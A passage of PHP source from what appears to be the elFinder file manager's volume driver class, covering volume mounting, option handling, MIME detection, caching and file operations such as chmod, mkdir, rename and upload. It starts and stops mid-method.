        $this->sessionCache = $this->session->start()->get($this->id, array());
        return true;
    }

    public function driverId() { return $this->driverId; }
    public function id() { return $this->id; }

    public function setSession($session) { $this->session = $session; }
    public function getSession() { return $this->session; }

    public function saveSessionCache()
    {
        $this->session->set($this->id, $this->sessionCache);
    }

    public function debug()
    {
        return array(
            'id' => $this->id(),
            'name' => strtolower(substr(get_class($this), strlen('elfinderdriver'))),
            'mimeDetect' => $this->mimeDetect,
            'imgLib' => $this->imgLib
        );
    }

    public function chmod($hash, $mode)
    {
        if ($this->commandDisabled('chmod')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (!($file = $this->file($hash))) {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
        if (!$this->options['allowChmodReadOnly']) {
            if (!$this->attr($this->decode($hash), 'write', null, ($file['mime'] === 'directory'))) {
                return $this->setError(elFinder::ERROR_PERM_DENIED, $file['name']);
            }
        }
        $path = $this->decode($hash);
        $write = $file['write'];
        if ($this->convEncOut(!$this->_chmod($this->convEncIn($path), $mode))) {
            return $this->setError(elFinder::ERROR_PERM_DENIED, $file['name']);
        }
        $this->clearstatcache();
        if ($path == $this->root) {
            $this->rootModified = true;
        }
        if ($file = $this->stat($path)) {
            $files = array($file);
            if ($file['mime'] === 'directory' && $write !== $file['write']) {
                foreach ($this->getScandir($path) as $stat) {
                    if ($this->mimeAccepted($stat['mime'])) {
                        $files[] = $stat;
                    }
                }
            }
            return $files;
        } else {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
    }

    public function fstat($hash)
    {
        $path = $this->decode($hash);
        return $this->stat($path);
    }

    public function clearstatcache()
    {
        clearstatcache();
        $this->clearcache();
    }

    public function clearcaches($hash = null)
    {
        if ($hash === null) {
            $this->clearcache();
        } else {
            $path = $this->decode($hash);
            unset($this->cache[$path], $this->dirsCache[$path]);
        }
    }

    public function mount(array $opts)
    {
        $this->options = array_merge($this->options, $opts);

        if (!isset($this->options['path']) || $this->options['path'] === '') {
            return $this->setError('Path undefined.');
        }
        if (!$this->session) {
            return $this->setError('Session wrapper dose not set. Need to `$volume->setSession(elFinderSessionInterface);` before mount.');
        }
        if (!($this->session instanceof elFinderSessionInterface)) {
            return $this->setError('Session wrapper instance must be "elFinderSessionInterface".');
        }

        if (!empty($this->options['driverId'])) {
            $this->driverId = $this->options['driverId'];
        }

        $this->id = $this->driverId . (!empty($this->options['id']) ? $this->options['id'] : elFinder::$volumesCnt++) . '_';
        $this->root = $this->normpathCE($this->options['path']);
        $this->separator = isset($this->options['separator']) ? $this->options['separator'] : DIRECTORY_SEPARATOR;
        if (!empty($this->options['winHashFix'])) {
            $this->separatorForHash = ($this->separator !== '/') ? '/' : '';
        }
        $this->systemRoot = isset($this->options['systemRoot']) ? $this->options['systemRoot'] : $this->separator;

        $this->ARGS = $_SERVER['REQUEST_METHOD'] === 'POST' ? $_POST : $_GET;
        $argInit = !empty($this->ARGS['init']);

        if (!is_bool($this->needOnline)) {
            $this->setNeedOnline();
        }

        if ($argInit) {
            $this->session->set($this->id, array());
        }
        $this->sessionCache = $this->session->get($this->id, array());

        $this->defaults = array(
            'read' => isset($this->options['defaults']['read']) ? !!$this->options['defaults']['read'] : true,
            'write' => isset($this->options['defaults']['write']) ? !!$this->options['defaults']['write'] : true,
            'locked' => isset($this->options['defaults']['locked']) ? !!$this->options['defaults']['locked'] : false,
            'hidden' => isset($this->options['defaults']['hidden']) ? !!$this->options['defaults']['hidden'] : false
        );

        $this->attributes[] = array(
            'pattern' => '~^' . preg_quote($this->separator) . '$~',
            'locked' => true,
            'hidden' => false
        );

        if (!empty($this->options['attributes']) && is_array($this->options['attributes'])) {
            foreach ($this->options['attributes'] as $a) {
                if (!empty($a['pattern']) || (is_array($a) && count($a) > 1)) {
                    $this->attributes[] = $a;
                }
            }
        }

        if (!empty($this->options['accessControl']) && is_callable($this->options['accessControl'])) {
            $this->access = $this->options['accessControl'];
        }

        $this->today = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
        $this->yesterday = $this->today - 86400;

        if (!$this->init()) {
            return false;
        }

        if (!empty($this->options['encoding']) && strtoupper($this->options['encoding']) !== 'UTF-8') {
            $this->encoding = $this->options['encoding'];
        } else {
            $this->encoding = null;
        }

        $this->uploadAllow = isset($this->options['uploadAllow']) && is_array($this->options['uploadAllow'])
            ? $this->options['uploadAllow'] : array();
        $this->uploadDeny = isset($this->options['uploadDeny']) && is_array($this->options['uploadDeny'])
            ? $this->options['uploadDeny'] : array();

        $this->options['uiCmdMap'] = (isset($this->options['uiCmdMap']) && is_array($this->options['uiCmdMap']))
            ? $this->options['uiCmdMap'] : array();

        if (is_string($this->options['uploadOrder'])) {
            $parts = explode(',', isset($this->options['uploadOrder']) ? $this->options['uploadOrder'] : 'deny,allow');
            $this->uploadOrder = array(trim($parts[0]), trim($parts[1]));
        } else {
            $this->uploadOrder = !empty($this->options['uploadOrder']) ? $this->options['uploadOrder'] : array('deny', 'allow');
        }

        if (!empty($this->options['uploadMaxSize'])) {
            $this->uploadMaxSize = elFinder::getIniBytes('', $this->options['uploadMaxSize']);
        }
        if (!defined('PHP_INT_MAX')) {
            define('PHP_INT_MAX', 2147483647);
        }
        if ($this->uploadMaxSize < 1 || $this->uploadMaxSize > PHP_INT_MAX) {
            $this->uploadMaxSize = PHP_INT_MAX;
        }

        $memLimit = elFinder::getIniBytes('memory_limit') / 2;
        if ($memLimit > 0) {
            $this->getMaxSize = empty($this->options['getMaxSize']) ? $memLimit : min($memLimit, elFinder::getIniBytes('', $this->options['getMaxSize']));
        } else {
            $this->getMaxSize = -1;
        }

        $this->disabled = isset($this->options['disabled']) && is_array($this->options['disabled'])
            ? array_values(array_diff($this->options['disabled'], array('open'))) : array();

        $this->cryptLib = $this->options['cryptLib'];
        $this->mimeDetect = $this->options['mimeDetect'];

        $regexp = '/text\/x\-(php|c\+\+)/';
        $auto_types = array();
        if (class_exists('finfo', false)) {
            $tmpFileInfo = explode(';', finfo_file(finfo_open(FILEINFO_MIME), __FILE__));
            if ($tmpFileInfo && preg_match($regexp, array_shift($tmpFileInfo))) {
                $auto_types[] = 'finfo';
            }
        }
        if (function_exists('mime_content_type')) {
            $_mimetypes = explode(';', mime_content_type(__FILE__));
            if (preg_match($regexp, array_shift($_mimetypes))) {
                $auto_types[] = 'mime_content_type';
            }
        }
        $auto_types[] = 'internal';

        $type = strtolower($this->options['mimeDetect']);
        if (!in_array($type, $auto_types)) {
            $type = 'auto';
        }
        if ($type == 'auto') {
            $type = array_shift($auto_types);
        }
        $this->mimeDetect = $type;

        if ($this->mimeDetect == 'finfo') {
            $this->finfo = finfo_open(FILEINFO_MIME);
        } else if ($this->mimeDetect == 'internal' && !elFinderVolumeDriver::$mimetypesLoaded) {
            elFinderVolumeDriver::loadMimeTypes(!empty($this->options['mimefile']) ? $this->options['mimefile'] : '');
        }

        $this->rootName = empty($this->options['alias']) ? $this->basenameCE($this->root) : $this->options['alias'];
        if ($this->rootName === '') $this->rootName = $this->separator;

        $this->_checkArchivers();
        $root = $this->stat($this->root);

        if (!$root) {
            return $this->setError('Root folder does not exist.');
        }
        if (!$root['read'] && !$root['write']) {
            return $this->setError('Root folder has not read and write permissions.');
        }

        if ($root['read']) {
            if ($argInit) {
                $startPath = $this->options['startPath'] ? $this->normpathCE($this->options['startPath']) : '';
                if ($startPath) {
                    $start = $this->stat($startPath);
                    if (!empty($start) && $start['mime'] == 'directory' && $start['read'] && empty($start['hidden'])
                        && $this->inpathCE($startPath, $this->root)) {
                        $this->startPath = $startPath;
                        if (substr($this->startPath, -1, 1) == $this->options['separator']) {
                            $this->startPath = substr($this->startPath, 0, -1);
                        }
                    }
                }
            }
        } else {
            $this->options['URL'] = '';
            $this->options['tmbURL'] = '';
            $this->options['tmbPath'] = '';
            array_unshift($this->attributes, array('pattern' => '/.*/', 'read' => false));
        }
        $this->treeDeep = $this->options['treeDeep'] > 0 ? (int)$this->options['treeDeep'] : 1;
        $this->tmbSize = $this->options['tmbSize'] > 0 ? (int)$this->options['tmbSize'] : 48;
        $this->URL = $this->options['URL'];
        if ($this->URL && preg_match("|[^/?&=]$|", $this->URL)) {
            $this->URL .= '/';
        }

        $dirUrlOwn = strtolower($this->options['dirUrlOwn']);
        if ($dirUrlOwn === 'auto') {
            $this->options['dirUrlOwn'] = $this->URL ? false : true;
        } else if ($dirUrlOwn === 'hide') {
            $this->options['dirUrlOwn'] = 'hide';
        } else {
            $this->options['dirUrlOwn'] = (bool)$this->options['dirUrlOwn'];
        }

        $this->tmbURL = !empty($this->options['tmbURL']) ? $this->options['tmbURL'] : '';
        if ($this->tmbURL && $this->tmbURL !== 'self' && preg_match("|[^/?&=]$|", $this->tmbURL)) {
            $this->tmbURL .= '/';
        }

        $this->nameValidator = !empty($this->options['acceptedName']) && (is_string($this->options['acceptedName']) || is_callable($this->options['acceptedName']))
            ? $this->options['acceptedName'] : '';

        $this->dirnameValidator = !empty($this->options['acceptedDirname']) && (is_callable($this->options['acceptedDirname']) || (is_string($this->options['acceptedDirname']) && preg_match($this->options['acceptedDirname'], '') !== false))
            ? $this->options['acceptedDirname'] : $this->nameValidator;

        if ($this->options['useRemoteArchive'] && empty($this->archivers['create']) && $this->getTempPath()) {
            $_archivers = $this->getArchivers();
            $this->archivers['create'] = $_archivers['create'];
        }

        if (!empty($this->options['archiveMimes']) && is_array($this->options['archiveMimes'])) {
            foreach ($this->archivers['create'] as $mime => $v) {
                if (!in_array($mime, $this->options['archiveMimes'])) {
                    unset($this->archivers['create'][$mime]);
                }
            }
        }

        if (!empty($this->options['archivers']['create']) && is_array($this->options['archivers']['create'])) {
            foreach ($this->options['archivers']['create'] as $mime => $conf) {
                if (strpos($mime, 'application/') === 0 && !empty($conf['cmd']) && isset($conf['argc']) && !empty($conf['ext']) && !isset($this->archivers['create'][$mime])) {
                    $this->archivers['create'][$mime] = $conf;
                }
            }
        }

        if (!empty($this->options['archivers']['extract']) && is_array($this->options['archivers']['extract'])) {
            foreach ($this->options['archivers']['extract'] as $mime => $conf) {
                if (strpos($mime, 'application/') === 0 && !empty($conf['cmd']) && isset($conf['argc']) && !empty($conf['ext']) && !isset($this->archivers['extract'][$mime])) {
                    $this->archivers['extract'][$mime] = $conf;
                }
            }
        }

        if (!empty($this->options['noSessionCache']) && is_array($this->options['noSessionCache'])) {
            foreach ($this->options['noSessionCache'] as $_key) {
                $this->sessionCaching[$_key] = false;
                unset($this->sessionCache[$_key]);
            }
        }
        if ($this->sessionCaching['subdirs']) {
            if (!isset($this->sessionCache['subdirs'])) {
                $this->sessionCache['subdirs'] = array();
            }
        }

        $this->configure();

        $this->disabled = array_values(array_unique($this->disabled));

        if ($this->options['syncMinMs'] !== 0) {
            $this->options['syncMinMs'] = max($this->options[$this->options['syncChkAsTs'] ? 'tsPlSleep' : 'lsPlSleep'] * 1000, intval($this->options['syncMinMs']));
        }

        if ($this->options['trashHash'] && empty($this->options['copyJoin'])) {
            $this->options['trashHash'] = '';
        }

        if (elFinder::$tmpLinkPath && !$this->options['tmpLinkPath']) {
            if (is_writeable(elFinder::$tmpLinkPath)) {
                $this->options['tmpLinkPath'] = elFinder::$tmpLinkPath;
            } else {
                elFinder::$tmpLinkPath = '';
            }
        }
        if ($this->options['tmpLinkPath'] && is_writable($this->options['tmpLinkPath'])) {
            $this->tmpLinkPath = realpath($this->options['tmpLinkPath']);
        } else if (!$this->tmpLinkPath && $this->tmbURL && $this->tmbPath) {
            $this->tmpLinkPath = $this->tmbPath;
            $this->options['tmpLinkUrl'] = $this->tmbURL;
        } else if (!$this->options['URL'] && is_writable('../files/.tmb')) {
            $this->tmpLinkPath = realpath('../files/.tmb');
            $this->options['tmpLinkUrl'] = '';
            if (!elFinder::$tmpLinkPath) {
                elFinder::$tmpLinkPath = $this->tmpLinkPath;
                elFinder::$tmpLinkUrl = '';
            }
        }

        if (elFinder::$tmpLinkUrl && !$this->options['tmpLinkUrl']) {
            $this->options['tmpLinkUrl'] = elFinder::$tmpLinkUrl;
        }
        if ($this->options['tmpLinkUrl']) {
            $this->tmpLinkUrl = $this->options['tmpLinkUrl'];
        }
        if ($this->tmpLinkPath && !$this->tmpLinkUrl) {
            $cur = realpath('./');
            $i = 0;
            while ($cur !== $this->systemRoot && strpos($this->tmpLinkPath, $cur) !== 0) {
                $i++;
                $cur = dirname($cur);
            }
            list($req) = explode('?', $_SERVER['REQUEST_URI']);
            $reqs = explode('/', dirname($req));
            $uri = join('/', array_slice($reqs, 0, count($reqs) - 1)) . substr($this->tmpLinkPath, strlen($cur));
            $https = (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off');
            $this->tmpLinkUrl = ($https ? 'https://' : 'http://')
                . $_SERVER['SERVER_NAME']
                . (((!$https && $_SERVER['SERVER_PORT'] == 80) || ($https && $_SERVER['SERVER_PORT'] == 443)) ? '' : (':' . $_SERVER['SERVER_PORT']))
                . $uri;
            if (!elFinder::$tmpLinkUrl) {
                elFinder::$tmpLinkUrl = $this->tmpLinkUrl;
            }
        }

        if ($this->tmpLinkPath) {
            $this->tmpLinkPath = rtrim($this->tmpLinkPath, '/');
        }
        if ($this->tmpLinkUrl) {
            $this->tmpLinkUrl = rtrim($this->tmpLinkUrl, '/');
        }

        if (isset($this->sessionCache['rootstat'])) {
            unset($this->sessionCache['rootstat'][$this->getRootstatCachekey()]);
        }
        $this->updateCache($this->root, $root);

        return $this->mounted = true;
    }

    public function umount() {}

    public function clearSessionCache()
    {
        $this->sessionCache = array();
    }

    public function error()
    {
        return $this->error;
    }

    public function isUploadableByName($name, $allowUnknown = false)
    {
        $mimeByName = $this->mimetype($name, true);
        return (($allowUnknown && $mimeByName === 'unknown') || $this->allowPutMime($mimeByName));
    }

    public function getMimeTable()
    {
        if (!elFinderVolumeDriver::$mimetypesLoaded) {
            elFinderVolumeDriver::loadMimeTypes();
        }
        return elFinderVolumeDriver::$mimetypes;
    }

    public function getExtentionByMime($mime, $suffix = '')
    {
        static $extTable = null;
        if (is_null($extTable)) {
            $extTable = array_flip(array_unique($this->getMimeTable()));
            foreach ($this->options['mimeMap'] as $pair => $_mime) {
                list($ext) = explode(':', $pair);
                if ($ext !== '*' && !isset($extTable[$_mime])) {
                    $extTable[$_mime] = $ext;
                }
            }
        }
        if ($mime && isset($extTable[$mime])) {
            return $suffix ? ($extTable[$mime] . $suffix) : $extTable[$mime];
        }
        return '';
    }

    public function setMimesFilter($mimes)
    {
        if (is_array($mimes)) {
            $this->onlyMimes = $mimes;
        }
    }

    public function root() { return $this->encode($this->root); }
    public function getRootPath() { return $this->root; }

    public function getHash($path, $name = '')
    {
        if ($name !== '') {
            $path = $this->joinPathCE($path, $name);
        }
        return $this->encode($path);
    }

    public function getPath($hash) { return $this->decode($hash); }

    public function defaultPath()
    {
        return $this->encode($this->startPath ? $this->startPath : $this->root);
    }

    public function options($hash)
    {
        $create = $createext = array();
        if (isset($this->archivers['create']) && is_array($this->archivers['create'])) {
            foreach ($this->archivers['create'] as $m => $v) {
                $create[] = $m;
                $createext[$m] = $v['ext'];
            }
        }
        $opts = array(
            'path' => $hash ? $this->path($hash) : '',
            'url' => $this->URL,
            'tmbUrl' => (!$this->imgLib && $this->options['tmbFbSelf']) ? 'self' : $this->tmbURL,
            'disabled' => $this->disabled,
            'separator' => $this->separator,
            'copyOverwrite' => intval($this->options['copyOverwrite']),
            'uploadOverwrite' => intval($this->options['uploadOverwrite']),
            'uploadMaxSize' => intval($this->uploadMaxSize),
            'uploadMaxConn' => intval($this->options['uploadMaxConn']),
            'uploadMime' => array(
                'firstOrder' => isset($this->uploadOrder[0]) ? $this->uploadOrder[0] : 'deny',
                'allow' => $this->uploadAllow,
                'deny' => $this->uploadDeny
            ),
            'dispInlineRegex' => $this->options['dispInlineRegex'],
            'jpgQuality' => intval($this->options['jpgQuality']),
            'archivers' => array(
                'create' => $create,
                'extract' => isset($this->archivers['extract']) && is_array($this->archivers['extract']) ? array_keys($this->archivers['extract']) : array(),
                'createext' => $createext
            ),
            'uiCmdMap' => (isset($this->options['uiCmdMap']) && is_array($this->options['uiCmdMap'])) ? $this->options['uiCmdMap'] : array(),
            'syncChkAsTs' => intval($this->options['syncChkAsTs']),
            'syncMinMs' => intval($this->options['syncMinMs']),
            'i18nFolderName' => intval($this->options['i18nFolderName']),
            'tmbCrop' => intval($this->options['tmbCrop']),
            'tmbReqCustomData' => (bool)$this->options['tmbReqCustomData'],
            'substituteImg' => (bool)$this->options['substituteImg'],
            'onetimeUrl' => (bool)$this->options['onetimeUrl'],
        );
        if (!empty($this->options['trashHash'])) {
            $opts['trashHash'] = $this->options['trashHash'];
        }
        if ($hash === null) {
            if (!empty($this->options['icon'])) {
                $opts['icon'] = $this->options['icon'];
            }
            if (!empty($this->options['rootCssClass'])) {
                $opts['csscls'] = $this->options['rootCssClass'];
            }
            if (isset($this->options['netkey'])) {
                $opts['netkey'] = $this->options['netkey'];
            }
        }
        return $opts;
    }

    public function getOption($name)
    {
        return isset($this->options[$name]) ? $this->options[$name] : null;
    }

    public function getOptionsPlugin($name = '')
    {
        if ($name) {
            return isset($this->options['plugin'][$name]) ? $this->options['plugin'][$name] : array();
        } else {
            return $this->options['plugin'];
        }
    }

    public function commandDisabled($cmd) { return in_array($cmd, $this->disabled); }

    public function mimeAccepted($mime, $mimes = null, $empty = true)
    {
        $mimes = is_array($mimes) ? $mimes : $this->onlyMimes;
        if (empty($mimes)) {
            return $empty;
        }
        return $mime == 'directory'
            || in_array('all', $mimes)
            || in_array('All', $mimes)
            || in_array($mime, $mimes)
            || in_array(substr($mime, 0, strpos($mime, '/')), $mimes);
    }

    public function isReadable()
    {
        $stat = $this->stat($this->root);
        return $stat['read'];
    }

    public function copyFromAllowed() { return !!$this->options['copyFrom']; }

    public function path($hash)
    {
        return $this->convEncOut($this->_path($this->convEncIn($this->decode($hash))));
    }

    public function realpath($hash)
    {
        $path = $this->decode($hash);
        return $this->stat($path) ? $path : false;
    }

    public function removed()
    {
        if ($this->removed) {
            $unsetSubdir = isset($this->sessionCache['subdirs']) ? true : false;
            foreach ($this->removed as $item) {
                if ($item['mime'] === 'directory') {
                    $path = $this->decode($item['hash']);
                    if ($unsetSubdir) {
                        unset($this->sessionCache['subdirs'][$path]);
                    }
                    if ($item['phash'] !== '') {
                        $parent = $this->decode($item['phash']);
                        unset($this->cache[$parent]);
                        if ($this->root === $parent) {
                            $this->sessionCache['rootstat'] = array();
                        }
                        if ($unsetSubdir) {
                            unset($this->sessionCache['subdirs'][$parent]);
                        }
                    }
                }
            }
            $this->removed = array_values($this->removed);
        }
        return $this->removed;
    }

    public function added() { return $this->added; }

    public function resetRemoved() { $this->resetResultStat(); }

    public function resetResultStat()
    {
        $this->removed = array();
        $this->added = array();
    }

    public function closest($hash, $attr, $val)
    {
        return ($path = $this->closestByAttr($this->decode($hash), $attr, $val)) ? $this->encode($path) : false;
    }

    public function file($hash)
    {
        $file = $this->stat($this->decode($hash));
        return ($file) ? $file : $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
    }

    public function dir($hash, $resolveLink = false)
    {
        if (($dir = $this->file($hash)) == false) {
            return $this->setError(elFinder::ERROR_DIR_NOT_FOUND);
        }
        if ($resolveLink && !empty($dir['thash'])) {
            $dir = $this->file($dir['thash']);
        }
        return $dir && $dir['mime'] == 'directory' && empty($dir['hidden'])
            ? $dir
            : $this->setError(elFinder::ERROR_NOT_DIR);
    }

    public function scandir($hash)
    {
        if (($dir = $this->dir($hash)) == false) {
            return false;
        }
        $path = $this->decode($hash);
        if ($res = $dir['read'] ? $this->getScandir($path) : $this->setError(elFinder::ERROR_PERM_DENIED)) {
            $dirs = null;
            if ($this->sessionCaching['subdirs'] && isset($this->sessionCache['subdirs'][$path])) {
                $dirs = $this->sessionCache['subdirs'][$path];
            }
            if ($dirs !== null || (isset($dir['dirs']) && $dir['dirs'] != 1)) {
                $_dir = $dir;
                if ($dirs || $this->subdirs($hash)) {
                    $dir['dirs'] = 1;
                } else {
                    unset($dir['dirs']);
                }
                if ($dir !== $_dir) {
                    $this->updateCache($path, $dir);
                }
            }
        }
        return $res;
    }

    public function ls($hash, $intersect = null)
    {
        if (($dir = $this->dir($hash)) == false || !$dir['read']) {
            return false;
        }
        $list = array();
        $path = $this->decode($hash);
        $check = array();
        if ($intersect) {
            $check = array_flip($intersect);
        }
        foreach ($this->getScandir($path) as $stat) {
            if (empty($stat['hidden']) && (!$check || isset($check[$stat['name']])) && $this->mimeAccepted($stat['mime'])) {
                $list[$stat['hash']] = $stat['name'];
            }
        }
        return $list;
    }

    public function tree($hash = '', $deep = 0, $exclude = '')
    {
        $path = $hash ? $this->decode($hash) : $this->root;
        if (($dir = $this->stat($path)) == false || $dir['mime'] != 'directory') {
            return false;
        }
        $dirs = $this->gettree($path, $deep > 0 ? $deep - 1 : $this->treeDeep - 1, $exclude ? $this->decode($exclude) : null);
        array_unshift($dirs, $dir);
        return $dirs;
    }

    public function parents($hash, $lineal = false)
    {
        if (($current = $this->dir($hash)) == false) {
            return false;
        }
        $args = func_get_args();
        $until = '';
        if (isset($args[2])) {
            $until = $args[2];
        }
        $path = $this->decode($hash);
        $tree = array();
        while ($path && $path != $this->root) {
            elFinder::checkAborted();
            $path = $this->dirnameCE($path);
            if (!($stat = $this->stat($path)) || !empty($stat['hidden']) || !$stat['read']) {
                return false;
            }
            array_unshift($tree, $stat);
            if (!$lineal) {
                foreach ($this->gettree($path, 0) as $dir) {
                    elFinder::checkAborted();
                    if (!isset($tree[$dir['hash']])) {
                        $tree[$dir['hash']] = $dir;
                    }
                }
            }
            if ($until && $until === $this->encode($path)) {
                break;
            }
        }
        return $tree ? array_values($tree) : array($current);
    }

    public function tmb($hash)
    {
        $path = $this->decode($hash);
        $stat = $this->stat($path);
        if (isset($stat['tmb'])) {
            $res = $stat['tmb'] == "1" ? $this->createTmb($path, $stat) : $stat['tmb'];
            if (!$res) {
                list($type) = explode('/', $stat['mime']);
                $fallback = $this->options['resourcePath'] . DIRECTORY_SEPARATOR . strtolower($type) . '.png';
                if (is_file($fallback)) {
                    $res = $this->tmbname($stat);
                    if (!copy($fallback, $this->tmbPath . DIRECTORY_SEPARATOR . $res)) {
                        $res = false;
                    }
                }
            }
            if ($res && $this->options['tmbGcMaxlifeHour'] && $this->options['tmbGcPercentage'] > 0) {
                $rand = mt_rand(1, 10000);
                if ($rand <= $this->options['tmbGcPercentage'] * 100) {
                    register_shutdown_function(array('elFinder', 'GlobGC'), $this->tmbPath . DIRECTORY_SEPARATOR . '*.png', $this->options['tmbGcMaxlifeHour'] * 3600);
                }
            }
            return $res;
        }
        return false;
    }

    public function size($hash) { return $this->countSize($this->decode($hash)); }

    public function open($hash)
    {
        if (($file = $this->file($hash)) == false || $file['mime'] == 'directory') {
            return false;
        }
        if (func_num_args() > 1) {
            $opts = func_get_arg(1);
        } else {
            $opts = array();
        }
        return $this->fopenCE($this->decode($hash), 'rb', $opts);
    }

    public function close($fp, $hash)
    {
        $this->fcloseCE($fp, $this->decode($hash));
    }

    public function mkdir($dsthash, $name)
    {
        if ($this->commandDisabled('mkdir')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (!$this->nameAccepted($name, true)) {
            return $this->setError(elFinder::ERROR_INVALID_DIRNAME);
        }
        if (($dir = $this->dir($dsthash)) == false) {
            return $this->setError(elFinder::ERROR_TRGDIR_NOT_FOUND, '#' . $dsthash);
        }
        $path = $this->decode($dsthash);
        if (!$dir['write'] || !$this->allowCreate($path, $name, true)) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (substr($name, 0, 1) === '/' || substr($name, 0, 1) === '\\') {
            return $this->setError(elFinder::ERROR_INVALID_DIRNAME);
        }
        $dst = $this->joinPathCE($path, $name);
        $stat = $this->isNameExists($dst);
        if (!empty($stat)) {
            return $this->setError(elFinder::ERROR_EXISTS, $name);
        }
        $this->clearcache();
        $mkpath = $this->convEncOut($this->_mkdir($this->convEncIn($path), $this->convEncIn($name)));
        if ($mkpath) {
            $this->clearstatcache();
            $this->updateSubdirsCache($path, true);
            $this->updateSubdirsCache($mkpath, false);
        }
        return $mkpath ? $this->stat($mkpath) : false;
    }

    public function mkfile($dst, $name)
    {
        if ($this->commandDisabled('mkfile')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (!$this->nameAccepted($name, false)) {
            return $this->setError(elFinder::ERROR_INVALID_NAME);
        }
        if (substr($name, 0, 1) === '/' || substr($name, 0, 1) === '\\') {
            return $this->setError(elFinder::ERROR_INVALID_DIRNAME);
        }
        $mimeByName = $this->mimetype($name, true);
        if ($mimeByName && !$this->allowPutMime($mimeByName)) {
            return $this->setError(elFinder::ERROR_UPLOAD_FILE_MIME, $name);
        }
        if (($dir = $this->dir($dst)) == false) {
            return $this->setError(elFinder::ERROR_TRGDIR_NOT_FOUND, '#' . $dst);
        }
        $path = $this->decode($dst);
        if (!$dir['write'] || !$this->allowCreate($path, $name, false)) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if ($this->isNameExists($this->joinPathCE($path, $name))) {
            return $this->setError(elFinder::ERROR_EXISTS, $name);
        }
        $this->clearcache();
        $res = false;
        if ($path = $this->convEncOut($this->_mkfile($this->convEncIn($path), $this->convEncIn($name)))) {
            $this->clearstatcache();
            $res = $this->stat($path);
        }
        return $res;
    }

    public function rename($hash, $name)
    {
        if ($this->commandDisabled('rename')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (!($file = $this->file($hash))) {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
        if ($name === $file['name']) {
            return $file;
        }
        if (!empty($this->options['netkey']) && !empty($file['isroot'])) {
            $rootKey = $this->getRootstatCachekey();
            if ($this->sessionCaching['rootstat']) {
                unset($this->sessionCaching['rootstat'][$rootKey]);
            }
            if (elFinder::$instance->updateNetVolumeOption($this->options['netkey'], 'alias', $name)) {
                $this->clearcache();
                $this->rootName = $this->options['alias'] = $name;
                return $this->stat($this->root);
            } else {
                return $this->setError(elFinder::ERROR_TRGDIR_NOT_FOUND, $name);
            }
        }
        if (!empty($file['locked'])) {
            return $this->setError(elFinder::ERROR_LOCKED, $file['name']);
        }
        $isDir = ($file['mime'] === 'directory');
        if (!$this->nameAccepted($name, $isDir)) {
            return $this->setError($isDir ? elFinder::ERROR_INVALID_DIRNAME : elFinder::ERROR_INVALID_NAME);
        }
        if (!$isDir) {
            $mimeByName = $this->mimetype($name, true);
            if ($mimeByName && !$this->allowPutMime($mimeByName)) {
                return $this->setError(elFinder::ERROR_UPLOAD_FILE_MIME, $name);
            }
        }
        $path = $this->decode($hash);
        $dir = $this->dirnameCE($path);
        $stat = $this->isNameExists($this->joinPathCE($dir, $name));
        if ($stat) {
            return $this->setError(elFinder::ERROR_EXISTS, $name);
        }
        if (!$this->allowCreate($dir, $name, ($file['mime'] === 'directory'))) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        $this->rmTmb($file);
        if ($path = $this->convEncOut($this->_move($this->convEncIn($path), $this->convEncIn($dir), $this->convEncIn($name)))) {
            $this->clearcache();
            return $this->stat($path);
        }
        return false;
    }

    public function duplicate($hash, $suffix = 'copy')
    {
        if ($this->commandDisabled('duplicate')) {
            return $this->setError(elFinder::ERROR_COPY, '#' . $hash, elFinder::ERROR_PERM_DENIED);
        }
        if (($file = $this->file($hash)) == false) {
            return $this->setError(elFinder::ERROR_COPY, elFinder::ERROR_FILE_NOT_FOUND);
        }
        $path = $this->decode($hash);
        $dir = $this->dirnameCE($path);
        $name = $this->uniqueName($dir, $file['name'], sprintf($this->options['duplicateSuffix'], $suffix));
        if (!$this->allowCreate($dir, $name, ($file['mime'] === 'directory'))) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        return ($path = $this->copy($path, $dir, $name)) == false
            ? false
            : $this->stat($path);
    }

    public function upload($fp, $dst, $name, $tmpname, $hashes = array())
    {
        if ($this->commandDisabled('upload')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (($dir = $this->dir($dst)) == false) {
            return $this->setError(elFinder::ERROR_TRGDIR_NOT_FOUND, '#' . $dst);
        }
        if (empty($dir['write'])) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (!$this->nameAccepted($name, false)) {
            return $this->setError(elFinder::ERROR_INVALID_NAME);
        }
        $mimeByName = '';
        if ($this->mimeDetect === 'internal') {
            $mime = $this->mimetype($tmpname, $name);
        } else {
            $mime = $this->mimetype($tmpname, $name);
            $mimeByName = $this->mimetype($name, true);
            if ($mime === 'unknown') {
                $mime = $mimeByName;
            }
        }
        if (!$this->allowPutMime($mime) || ($mimeByName && !$this->allowPutMime($mimeByName))) {
            return $this->setError(elFinder::ERROR_UPLOAD_FILE_MIME, '(' . $mime . ')');
        }
        $tmpsize = (int)sprintf('%u', filesize($tmpname));
        if ($this->uploadMaxSize > 0 && $tmpsize > $this->uploadMaxSize) {
            return $this->setError(elFinder::ERROR_UPLOAD_FILE_SIZE);
        }
        $dstpath = $this->decode($dst);
        if (isset($hashes[$name])) {
            $test = $this->decode($hashes[$name]);
            $file = $this->stat($test);
        } else {
            $test = $this->joinPathCE($dstpath, $name);
            $file = $this->isNameExists($test);
        }
        $this->clearcache();
        if ($file && $file['name'] === $name) {
            if ($this->uploadOverwrite) {
                if (!$file['write']) {
                    return $this->setError(elFinder::ERROR_PERM_DENIED);
                } elseif ($file['mime'] == 'directory') {
                    return $this->setError(elFinder::ERROR_NOT_REPLACE, $name);
                }
                $this->remove($test);
            } else {
                $name = $this->uniqueName($dstpath, $name, '-', false);
            }
        }
